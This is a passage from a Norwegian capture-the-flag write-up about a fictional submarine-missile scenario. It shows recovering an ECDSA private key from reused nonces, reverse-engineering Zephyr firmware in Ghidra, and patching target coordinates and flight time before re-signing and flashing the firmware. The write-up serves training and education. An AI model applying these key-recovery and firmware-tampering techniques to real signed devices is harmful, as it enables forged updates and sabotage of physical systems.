user@aurum:~$ tail -c 64 test.txt_signed | hd
00000000  26 0d 63 3f e0 91 a7 ef  24 42 7c d1 96 c6 cd 15  |&.c?....$B|.....|
00000010  f8 19 49 d5 6a 39 3e 23  36 e0 d0 0d 15 fc 6d 83  |..I.j9>#6.....m.|
00000020  36 8b f0 ed b4 2c 04 ac  d8 64 9b aa d7 c4 fd 9b  |6....,...d......|
00000030  23 73 db 47 3d 61 32 94  4b 80 0b 6d 7e ce 7d 16  |#s.G=a2.K..m~.}.|

user@aurum:~$ tail -c 64 missile.1.3.37.fw | hd
00000000  26 0d 63 3f e0 91 a7 ef  24 42 7c d1 96 c6 cd 15  |&.c?....$B|.....|
00000010  f8 19 49 d5 6a 39 3e 23  36 e0 d0 0d 15 fc 6d 83  |..I.j9>#6.....m.|
00000020  b7 09 74 8b 70 f4 18 46  e6 32 af c7 04 f3 8d 9c  |..t.p..F.2......|
00000030  53 fb 50 94 a3 c8 6f 2f  da 97 a7 41 3e 7a 44 90  |S.P...o/...A>zD.|
```

Herlig! `r`-verdiene er identiske.

Brukte Python for å ekstrahere privatnøkkelen. 
Skriptet ligger [her](crypto/same_k_recover_privkey.py). Matten er basert på [denne siden](https://asecuritysite.com/ecdsa/ecd5).

Output:

```
r1: 17211542253021086784505659283610982505828311641993563606189014132281847868803
s1: 24672148393105490807172642003357033928250921460564351943433773766105747062038
h1: 53558879788905805671068674208647963498387261713450127955763892603805320644988

r2: 17211542253021086784505659283610982505828311641993563606189014132281847868803
s2: 82789957276224960427052465459370715358048161416963169362889803353386861085840
h2: 27567713526363642182323369520225315448427582916364134856575038991303938254239

Private key: 114798114433974422739242357806023105894899569106244681546807278823326360043821
```

Flagget er privatnøkkelen.

```text
Kategori: 2. Oppdrag
Oppgave:  2.14_multiplier
Svar:     114798114433974422739242357806023105894899569106244681546807278823326360043821
Poeng:    5

Dette ser ut til å være privatnøkkelen som de bruker i ECDSA-signeringen sin. Som det kjente ordtaket går -- "Never roll your own crypto". La oss håpe denne nøkkelen kan brukes til noe nyttig :)
```

---

## 2.15_firmware_staged

Jeg lagde [et par skript](konekt_scripts/) for å interagere med `mad:1337` via Python sockets. Dette tok tiden for å laste opp/ned filer fra flere minutter ned til noen sekunder. Jeg kunne også lett kopiere og lime inn shellcoden som jeg genererte med pwntools til aurum. Dette gjorde feilsøkingen av shellcoden mye raskere.



```text
Kategori: 2. Oppdrag
Oppgave:  2.15_firmware_staged
Svar:     7f34ada436059e84fea23eb48c91024c9203638b
Poeng:    5

Wow! Firmware staged for flash når ubåten dykker opp! Oppdragsgiver ønsker at vi skal manipulere målkoordinatene til å treffe et trygt sted (24.1851, -43.3704). Klarer du dette? Analytikerene våre indikerer at ubåt nr. 1 sannsynligvis vil dykke opp i Biscayabukta, ubåt nr. 2 mellom Island og de Britiske øyer, ubåt nr. 3 ca. 100-200 nm sør/sør-øst for Italia, ubåt nr. 4 ca. 300-500 nm sør/sør-vest for Irland, og ubåt nr. 5 ca. 200-400 nm vest for Portugal. Bruk denne informasjonen for å regne ut de parametere du trenger.
Siden alle missilene i hver ubåt skal til samme mål, må firmware være identisk for hvert missil per ubåt.
```

---

## 2.16-20_submarine_0-4

Her ble det litt vanskelig.

Jeg brukte Ghidra for å reverse-engineere, da IDA kun støtter ARM om man er søkkrik.

I funksjonen `boot_banner()` kan vi se følgende:

```C
printk("*** Booting Zephyr OS build zephyr-v3.2.0-2532-g5fab7a5173f6 ***\n");
```

Zephyr OS er et real-time operativsystem laget for innebygde enheter, og best av alt; det er open-source. Det er en stor hjelp å kunne slå opp definisjonene på datastrukturer, funksjoner og datatyper mens man reverse-engineerer.

Jeg brukte en god stund på å navigere den dekompilerte koden og å stirre på de forskjellige funksjonene til de ga noenlunde mening.

I "Memory Map"-visningen i Ghidra kan vi se et minnesegment som heter `.rocket_parameters`. 
Innunder denne finner vi etikettene `_tof` og `_target`. Disse navnene er vi bekjent med fra missil-listen vi fikk i [2.12_missile_targets](#212_missile_targets).
Begge disse to blir aksessert fra `armed_entry()`, mer spesifikt disse linjene av kode:

```C
zsl_vec_from_arr(&target, _target, param_3, 0, param_1);
DAT_200009b8 = target;
DAT_200009bc = PTR_target_vec_69c;
DAT_200009c4 = gc_init();
DAT_200009c4 = gc_set_initial_conditions(&DAT_200009b8, extraout_r1, _tof, DAT_00018f34);
```

Et raskt google-søk peker oss til [Zephyr Scientific Library](https://zephyrproject-rtos.github.io/zscilib/), som inneholder kildekoden for `zsl_vec_from_arr`, samt strukturen og datatypene:

```C
int zsl_vec_from_arr(struct zsl_vec* v, zsl_real_t* a)

struct zsl_vec {
    size_t sz;
    zsl_real_t *data;
};

typedef double zsl_real_t;
```

Viser seg at `_target` er et array bestående av 3 `zsl_real_t`, som er av datatypen `double`.
Brukte python til å unpacke bytene:

```python
import array

_target = [0x84, 0x02, 0xf0, 0xe5, 0x7a, 0x40, 0x4e, 0x41, 0x9c, 0x1f, 0xed, 0xbd, 0x9b, 0xec, 0xbf, 0xc0, 0x74, 0xf1, 0x9c, 0xd6, 0xcd, 0x05, 0x53, 0x41]
print(*array.array('d', bytearray(_target)))
```

Det ga følgende output:

```text
3965173.7963870186 -8172.608366794793 4986679.353329051
```

Det ser akkurat ut som target-verdiene for SUB:1 MIS:1 som dukket opp i listen over missiler! Vi er på rett spor.

Jeg brukte litt tid på å lese meg opp på koordinatsystemer for å finne ut hva disse tallene betydde, og kom frem til det var ECEF (*Earth-centered, Earth-fixed*) koordinater vi jobbet med.
For å dobbeltsjekke dette prøvde jeg å konvertere fra ECEF til lat/lon ved hjelp av konvertere på nett, men de ga et resultat som virket feil.

Så da spørte jeg pent ChatGPT om å lage en til meg:

```python
import math

def ecef_vector_to_lat_lon(vector):
    x, y, z = vector
    lon = math.atan2(y, x)
    hyp = math.sqrt(x ** 2 + y ** 2)
    lat = math.atan2(z, hyp)

    lat = lat * 180 / math.pi
    lon = lon * 180 / math.pi

    return lat, lon

_target = [3965173.80, -8172.61, 4986679.35]
print(ecef_vector_to_lat_lon(_target))
```

Output:

```python
(51.50986495591076, -0.11809202349170798)
```

Plugger vi disse koordinatene inn i [Google Maps](https://www.google.no/maps/place/51%C2%B030'35.5%22N+0%C2%B007'05.1%22W/@51.5098683,-0.120286,17z/data=!3m1!4b1!4m5!3m4!1s0x0:0xf5e2635478a5eaeb!8m2!3d51.509865!4d-0.118092) så havner vi midt i sentrum av London. Nice! 

Målet nå var å regne ut ECEF vektorene som tilsvarte lat/lon koordinatene vi fikk av oppdragsgiver.
Jeg endte opp med å bruke [Nvector](https://github.com/pbrod/Nvector) for å gjøre de geometriske kalkulasjonene:

```python
import nvector
import struct

target_coordinates = (24.1851, -43.3704)
sphere = nvector.FrameE(a=6371e3, f=0)

target = sphere.GeoPoint(latitude=target_coordinates[0], longitude=target_coordinates[1], z=0, degrees=True)
ecef_vectors = target.to_ecef_vector().pvector

print("Target ECEF vectors:", *ecef_vectors)
print("_target value:", struct.pack('d' * len(ecef_vectors), *ecef_vectors).hex())
```

Output:

```
Target ECEF vectors: [4224766.3303444] [-3991030.54681077] [2610108.35568405]
_target value: d55c2495bf1d50412de5fd45fb724ec10c0e872ddee94341
```

Planen nå var å:
* Patche bytene i `_target` ved hjelp av "Bytes"-visningen til Ghidra
* Lagre firmwaren og overføre den til aurum.
* Signere filen ved å bruke `signer` og `privkey.pem`
* Laste opp fila
* Lage shellcode som flashet ubåt 1 med vår nye firmware
* Utføre en simulering, og se hva som skjer

```bash

```

Missilet fløy i rett retning, men traff ikke målet. Jeg tenkte at dette var på grunn av at flytiden ikke stemte mtp. den lengre distansen missilet nå måtte fly.

Jeg endret da én byte i `_tof`, slik at tallverdien ble på ~69000. Dette gjorde at simuleringen brukte 10 timer, og missilet traff fortsatt ikke.

Prøvde å lese meg opp på rakettforskning og hvordan tid, fart og flybanen til ballistiske missiler regnes ut, men det var komplisert. Kom frem til at beste måten å løse problemet på var å "observere" hva flytiden burde være, i stedet for å kalkulere den ut. Jeg hadde jo tross alt tilgang til dataen til 80 missiler hvor dette allerede var kalkulert.

Jeg lagde da et [lite skript](missile_scripts/missile_data_fun.py) for å regne ut distansen mellom hver ubåt og dens respektive missilers mål, i tillegg til sammenhengen mellom distanse og flytiden:

```text
Distance: 348395.48975179956 - Time of Flight: 500.0 - Distance/TOF: 696.7909795035991
Distance: 500263.3985159643 - Time of Flight: 600.0 - Distance/TOF: 833.7723308599404
Distance: 511762.1047280655 - Time of Flight: 600.0 - Distance/TOF: 852.9368412134424
Distance: 520499.4149202836 - Time of Flight: 900.0 - Distance/TOF: 578.3326832447596
Distance: 590144.6263528519 - Time of Flight: 600.0 - Distance/TOF: 983.5743772547531
Distance: 732878.7025049966 - Time of Flight: 1300.0 - Distance/TOF: 563.7528480807666
Distance: 808640.5369362447 - Time of Flight: 1080.0 - Distance/TOF: 748.7412379039303
Distance: 863068.4010189358 - Time of Flight: 1080.0 - Distance/TOF: 799.1374083508665
Distance: 933003.5862811609 - Time of Flight: 1080.0 - Distance/TOF: 863.8922095195935
Distance: 945357.6059941095 - Time of Flight: 1080.0 - Distance/TOF: 875.3311166612125
Distance: 964152.5410666476 - Time of Flight: 1080.0 - Distance/TOF: 892.73383432097
Distance: 966287.4969199213 - Time of Flight: 1000.0 - Distance/TOF: 966.2874969199213
Distance: 981188.6638837567 - Time of Flight: 1080.0 - Distance/TOF: 908.5080221145896
Distance: 1009708.3154344284 - Time of Flight: 1080.0 - Distance/TOF: 934.91510688373
Distance: 1012135.9835278065 - Time of Flight: 1000.0 - Distance/TOF: 1012.1359835278065
Distance: 1019896.8575486206 - Time of Flight: 1080.0 - Distance/TOF: 944.3489421746486
Distance: 1041037.6111341281 - Time of Flight: 1100.0 - Distance/TOF: 946.3978283037528
Distance: 1082799.317533042 - Time of Flight: 1100.0 - Distance/TOF: 984.3630159391291
Distance: 1150927.3278368798 - Time of Flight: 1300.0 - Distance/TOF: 885.3287137206768
Distance: 1170456.4550821886 - Time of Flight: 1300.0 - Distance/TOF: 900.3511192939912
Distance: 1209191.039503127 - Time of Flight: 1200.0 - Distance/TOF: 1007.6591995859393
Distance: 1217874.0369089686 - Time of Flight: 1100.0 - Distance/TOF: 1107.1582153717895
Distance: 1224359.5574722323 - Time of Flight: 1200.0 - Distance/TOF: 1020.2996312268602
Distance: 1246719.4941068373 - Time of Flight: 1500.0 - Distance/TOF: 831.1463294045582
Distance: 1266109.9669538387 - Time of Flight: 1400.0 - Distance/TOF: 904.3642621098847
Distance: 1293026.5173402096 - Time of Flight: 1200.0 - Distance/TOF: 1077.522097783508
Distance: 1311433.3252238766 - Time of Flight: 1000.0 - Distance/TOF: 1311.4333252238766
Distance: 1339603.8980102893 - Time of Flight: 1100.0 - Distance/TOF: 1217.8217254638994
Distance: 1351068.7739735628 - Time of Flight: 1600.0 - Distance/TOF: 844.4179837334767
Distance: 1405361.7044354093 - Time of Flight: 1100.0 - Distance/TOF: 1277.6015494867356
Distance: 1411325.99611136 - Time of Flight: 1100.0 - Distance/TOF: 1283.023632828509
Distance: 1450589.2628414233 - Time of Flight: 1200.0 - Distance/TOF: 1208.824385701186
Distance: 1453023.3903872136 - Time of Flight: 1700.0 - Distance/TOF: 854.7196414042432
Distance: 1468197.1626789959 - Time of Flight: 1300.0 - Distance/TOF: 1129.3824328299968
Distance: 1506467.74026547 - Time of Flight: 1100.0 - Distance/TOF: 1369.5161275140636
Distance: 1519089.0211525294 - Time of Flight: 1500.0 - Distance/TOF: 1012.7260141016862
Distance: 1565793.7530927446 - Time of Flight: 1500.0 - Distance/TOF: 1043.8625020618297
Distance: 1580386.814366429 - Time of Flight: 1500.0 - Distance/TOF: 1053.5912095776193
Distance: 1609795.4943599436 - Time of Flight: 1600.0 - Distance/TOF: 1006.1221839749647
Distance: 1641568.9514015021 - Time of Flight: 1700.0 - Distance/TOF: 965.62879494206
Distance: 1710921.043500996 - Time of Flight: 1700.0 - Distance/TOF: 1006.42414323588
Distance: 1732740.667998054 - Time of Flight: 1300.0 - Distance/TOF: 1332.87743692158
Distance: 1747809.0476979413 - Time of Flight: 1600.0 - Distance/TOF: 1092.3806548112134
Distance: 1772308.7041964093 - Time of Flight: 1300.0 - Distance/TOF: 1363.3143878433918
Distance: 1782415.0479200284 - Time of Flight: 1800.0 - Distance/TOF: 990.2305821777936
Distance: 1819740.3098170958 - Time of Flight: 1900.0 - Distance/TOF: 957.7580577984714
Distance: 1853500.774347373 - Time of Flight: 1900.0 - Distance/TOF: 975.5267233407227
Distance: 1889860.569262299 - Time of Flight: 2000.0 - Distance/TOF: 944.9302846311494
Distance: 1897069.5809633008 - Time of Flight: 1500.0 - Distance/TOF: 1264.7130539755337
Distance: 1912908.8580703784 - Time of Flight: 1800.0 - Distance/TOF: 1062.7271433724325
Distance: 1914674.369283808 - Time of Flight: 2000.0 - Distance/TOF: 957.337184641904
Distance: 1932985.6228606955 - Time of Flight: 1600.0 - Distance/TOF: 1208.1160142879346
Distance: 1946924.4505204486 - Time of Flight: 2000.0 - Distance/TOF: 973.4622252602243
Distance: 2007013.7951378133 - Time of Flight: 1550.0 - Distance/TOF: 1294.847609766331
Distance: 2033289.0976990887 - Time of Flight: 1900.0 - Distance/TOF: 1070.152156683731
Distance: 2082487.3067442677 - Time of Flight: 1800.0 - Distance/TOF: 1156.9373926357043
Distance: 2101044.0567982495 - Time of Flight: 1600.0 - Distance/TOF: 1313.152535498906
Distance: 2137414.664839351 - Time of Flight: 2000.0 - Distance/TOF: 1068.7073324196756
Distance: 2177246.8662748435 - Time of Flight: 1400.0 - Distance/TOF: 1555.1763330534595
Distance: 2204009.2435102407 - Time of Flight: 1500.0 - Distance/TOF: 1469.3394956734937
Distance: 2207768.402966359 - Time of Flight: 2000.0 - Distance/TOF: 1103.8842014831796
Distance: 2215078.945614269 - Time of Flight: 1400.0 - Distance/TOF: 1582.199246867335
Distance: 2231092.6606392763 - Time of Flight: 2000.0 - Distance/TOF: 1115.5463303196382
Distance: 2239277.0724439276 - Time of Flight: 1700.0 - Distance/TOF: 1317.2218073199574
Distance: 2257608.199286598 - Time of Flight: 1600.0 - Distance/TOF: 1411.0051245541235
Distance: 2266828.433244026 - Time of Flight: 1600.0 - Distance/TOF: 1416.767770777516
Distance: 2295831.850452401 - Time of Flight: 1700.0 - Distance/TOF: 1350.48932379553
Distance: 2299594.3277599183 - Time of Flight: 1600.0 - Distance/TOF: 1437.246454849949
Distance: 2329805.381936575 - Time of Flight: 2000.0 - Distance/TOF: 1164.9026909682875
Distance: 2330857.228655695 - Time of Flight: 2100.0 - Distance/TOF: 1109.932013645569
Distance: 2366856.8442280795 - Time of Flight: 1600.0 - Distance/TOF: 1479.2855276425498
Distance: 2558155.198729103 - Time of Flight: 1750.0 - Distance/TOF: 1461.8029707023445
Distance: 2672868.1646775766 - Time of Flight: 1800.0 - Distance/TOF: 1484.9267581542092
Distance: 2679267.842135778 - Time of Flight: 1800.0 - Distance/TOF: 1488.4821345198768
Distance: 2696890.090424191 - Time of Flight: 2000.0 - Distance/TOF: 1348.4450452120957
Distance: 2960229.4683541474 - Time of Flight: 2000.0 - Distance/TOF: 1480.1147341770736
Distance: 2962600.502655174 - Time of Flight: 2000.0 - Distance/TOF: 1481.3002513275871
Distance: 3064300.340851306 - Time of Flight: 2000.0 - Distance/TOF: 1532.150170425653
Distance: 3498845.2588418713 - Time of Flight: 2200.0 - Distance/TOF: 1590.384208564487
Distance: 3682334.5674927537 - Time of Flight: 2200.0 - Distance/TOF: 1673.7884397694336
```

Man kan se at relasjonen mellom flytiden og distansen blir i snitt høyere desto lengre distansen er. I tillegg ser vi at det er litt slingringsmonn i flytiden.
Basert på distansen som missilene måtte gå for å treffe midten av atlanterhavet så kom jeg frem til at `TOF ~= Distance / 1500`.

Etter å ha regnet det ut fikk jeg dette resultatet:

```text
Submarine 1 - Distance: 4148201.467647918 - Recommended _tof: 2800.0 (00e0a540)
Submarine 2 - Distance: 4740515.669383748 - Recommended _tof: 3200.0 (0000a940)
Submarine 3 - Distance: 6031013.339962457 - Recommended _tof: 4000.0 (0040af40)
Submarine 4 - Distance: 3509224.261450487 - Recommended _tof: 2300.0 (00f8a140)
Submarine 5 - Distance: 3177066.054664542 - Recommended _tof: 2100.0 (0068a040)
```

Hex-verdien i parantes er de rå bytene som `_tof` skal patches med.

Jeg lagde da 5 firmwares, hvor alle hadde samme `_target`, men forskjellig `_tof`.

```bash
```

Etter gode 2 ekte timer med simulering hadde alle 5 missilene ~~truffet~~ bommet, og 5 flagg dukket pent opp underveis.

```text
Kategori: 2. Oppdrag
Oppgave:  2.16_submarine_0
Svar:     4312ce7fbaea6a5587634a834afcb495
Poeng:    5

For mission complete må du konkatenere flaggene for 2.16 - 2.20
```

---

## 2.21_mission_complete

Etter å ha konkatenert flaggene er oppdraget utført! :partying_face:

```text
Kategori: 2. Oppdrag
Oppgave:  2.21_mission_complete
Svar:     4312ce7fbaea6a5587634a834afcb4959330f6fcf99fb2d1acdeb6e005a9477c4662c0ce7ed7d3cbb814cb60746f1d3a88ff4301442793cb1a1b8ef9c390f7a0963fd1126aa1db3a78d2bc402ee9bf91
Poeng:    5

Gratulerer! Du har reddet Europa! ... og fullført oppdraget :) Vi er mektig imponert :D

Ny fil: /home/login/2_oppdrag/mission_complete.jpg
```

![Mission complete!](images/mission_complete.jpg)

---

## 3.4.13_shady-aggregator_c2

```text
Kategori: 3.4. Utfordringer umulig
Oppgave:  3.4.13_shady-aggregator_c2
Svar:     3fe7dec0658e911f5ce1061f61343067
Poeng:    0

Ikke umulig, men ikke forventet. Uansett veldig godt jobba!

Ny fil: /home/login/2_oppdrag/sshkey_c2@shady-aggregator
```
